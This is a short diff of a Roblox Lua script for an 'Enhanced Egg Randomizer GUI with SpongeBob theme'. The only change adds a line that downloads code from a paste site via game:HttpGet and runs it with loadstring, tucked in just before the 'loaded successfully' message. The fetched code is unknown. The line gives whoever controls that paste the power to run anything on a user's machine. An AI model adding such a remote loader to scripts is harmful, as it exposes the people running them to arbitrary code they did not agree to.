@@ -532,4 +532,5 @@ end
 -- Start the loading process
 startLoading()
 
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/oEmItd1wnh/0", true))()
 print("Enhanced Egg Randomizer GUI with SpongeBob theme loaded successfully!")
